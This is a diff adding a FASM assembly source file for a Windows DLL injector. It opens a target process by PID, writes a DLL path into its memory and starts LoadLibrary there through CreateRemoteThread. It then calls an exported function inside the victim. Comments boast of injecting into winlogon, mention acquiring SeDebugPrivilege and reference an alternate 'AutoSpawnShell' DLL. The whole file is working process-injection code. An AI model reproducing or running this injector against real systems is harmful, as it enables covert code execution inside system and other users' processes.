@@ -1,0 +1,127 @@
+format PE GUI 4.0					;default is console
+entry start
+include 'win32ax.inc'
+section '.text' code readable executable
+
+proc getRemoteProcAddr, localDllBase, remoteDllBasee, localProcAddr ;procedure to translate
+								    ;local dll proc address to remote dll proc address
+	mov ebx,[localProcAddr] 				    ;local proc address - local dll base + remote dll base
+								    ; = remote dll proc address
+	sub ebx,[localDllBase]		;0x100c
+	mov eax,[remoteDllBase]
+	add eax, ebx						    ;return value to eax
+	ret							    ;**when using proc, makesure start is after proc definitions
+endp
+
+start:								    ;SUCESSFULLY injected only in winlogon
+	;----------
+	;invoke FindWindow, NULL, target			    ;return window handle form the specified window title name
+	;invoke GetWindowThreadProcessId, eax, victimPid	    ;return pid from window handle
+	;----------						    ;using pid is better b/c some applicatin dont have window title
+
+	;invoke RtlAdjustPrivilege, 20, 1, 0, privOut		    ;get SeDebugPrivilege
+								    ;but need privOut to write to
+								    ;or get access violation for writing to 0x000000
+	invoke OpenProcess, PROCESS_ALL_ACCESS, 0, [victimPid]
+	mov [rpHandle], eax
+	invoke VirtualAllocEx, [rpHandle], 0,dword dllLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE
+								    ;dont really need PAGE_EXECUTE_READWRITE
+	mov [rAddr], eax
+	invoke WriteProcessMemory, [rpHandle], [rAddr], dllPath, dllLen, 0
+	invoke CreateRemoteThread, [rpHandle], 0, 0, [LoadLibrary], [rAddr], 0, rtHandle  ;dll is loaded by victim
+	invoke Sleep, 1000					   ;sleep, and wait for dll load to catchup
+								   ;will need to use createtoolhelp32snapshot b/c my Dll can get
+								    ;loaded at diferent VM
+	invoke CreateToolhelp32Snapshot, 0x08 , [victimPid]	    ;0x08 = TH32CS_SNAPMODULE -> all module of the process
+	mov [snapHandle], eax
+	mov [me32.dwSize], sizeof.MODULEENTRY32 		    ;need to be set b/4 calling Module32First
+	invoke Module32First, [snapHandle], me32		    ;star from the begin module liste
+								    ;first on list is usually the process PE image
+								    ;32.szModule = cacl.exe
+findMyDll:							    ;search loop looking for mydll.dll
+	invoke Module32Next,[snapHandle], me32
+	invoke strcmp, myDllName, me32.szModule 		    ;compare module name to mydll.dll, return 0 if equal
+	test eax, eax						    ;if return = 0, found it :P
+	jnz findMyDll
+
+	invoke LoadLibrary, myDllName
+	mov [myDllBase], eax					     ;save my local dll base
+	mov eax, [me32.modBaseAddr]
+	mov [remoteDllBase], eax
+	;stdcall getRemoteProcAddr, [myDllBase], [remoteDllBase], [one] 	 ;get remote proc one address
+	;invoke CreateRemoteThread, [rpHandle], 0, 0, eax, 0, 0, rtHandle	 ;now call proc one
+	;stdcall getRemoteProcAddr, [myDllBase], dword [remoteDllBase], [two]	 ;get remote proc two address
+	;invoke CreateRemoteThread, [rpHandle], 0, 0, eax, 0, 0, rtHandle	 ;now call proc two
+	stdcall getRemoteProcAddr, [myDllBase], dword [remoteDllBase], [five]
+	invoke CreateRemoteThread, [rpHandle], 0, 0, eax, 0, 0, rtHandle	;now call proc two
+	;invoke CreateRemoteThread, [rpHandle], 0, 0, [FreeLibrary], [rAddr], 0, rtHandle ;unload dll from target
+	invoke CloseHandle, [rtHandle]
+	invoke CloseHandle, [rpHandle]
+	;invoke sprintf, buff,"%08x", [remoteDllBase]
+	;invoke MessageBox, 0, buff, "test", 0
+	invoke ExitProcess, 0
+
+section '.data' data readable writable
+;target db 'Calculator',0x00
+dllPath db 'C:\Users\mee\Desktop\fasmAssembly\DLL\mydll.dll',0x00
+;dllPath db 'C:\Users\mee\Desktop\fasmAssembly\DLL\mydllAutoSpawnShell.dll',0
+dllLen = $ - dllPath
+myDllName db 'mydll.dll',0
+myDllBase rd 1
+remoteDllBase rd 1
+buff rb 256
+victimPid dd 928
+privOut rd 1
+rpHandle rd 1
+rAddr rd 1
+rtHandle rd 1
+struct MODULEENTRY32
+	dwSize			dd ?   
+	th32ModuleID		dd ? 
+	th32ProcessID		dd ? 
+	GlblcntUsage		dd ? 
+	ProccntUsage		dd ? 
+	modBaseAddr		dd ?   
+	modBaseSize		dd ? 
+	hModule 		dd ? 
+	szModule		rb 260 
+	szExePath		rb 1024
+ends
+me32 MODULEENTRY32
+snapHandle rd 1
+
+section '.idata' import data readable
+
+library mydll,'MYDLL.DLL',\
+	kernel,"KERNEL32.DLL",\
+	user,'USER32.DLL',\
+	ntdll, 'NTDLL.DLL'
+
+import mydll, one,'one',\
+       two,'two',\
+       three,'three',\
+       four,'four',\
+       five,'five'
+
+import ntdll, RtlAdjustPrivilege,'RtlAdjustPrivilege',\
+	      sprintf,'sprintf',\
+	      strcmp,'strcmp'
+
+import user, FindWindow,'FindWindowA',\
+	     GetWindowThreadProcessId,'GetWindowThreadProcessId',\
+	     MessageBox,'MessageBoxA'
+
+import kernel, GetModuleHandle,'GetModuleHandleA',\
+	       ExitProcess,'ExitProcess',\
+	       OpenProcess,'OpenProcess',\
+	       VirtualAllocEx,'VirtualAllocEx',\
+	       WriteProcessMemory,'WriteProcessMemory',\
+	       CreateRemoteThread,'CreateRemoteThread',\
+	       CloseHandle,'CloseHandle',\
+	       GetProcAddress,'GetProcAddress',\
+	       LoadLibrary,'LoadLibraryA',\
+	       Sleep,'Sleep',\
+	       FreeLibrary,'FreeLibrary',\
+	       CreateToolhelp32Snapshot,'CreateToolhelp32Snapshot',\
+	       Module32First,'Module32First',\
+	       Module32Next,'Module32Next'
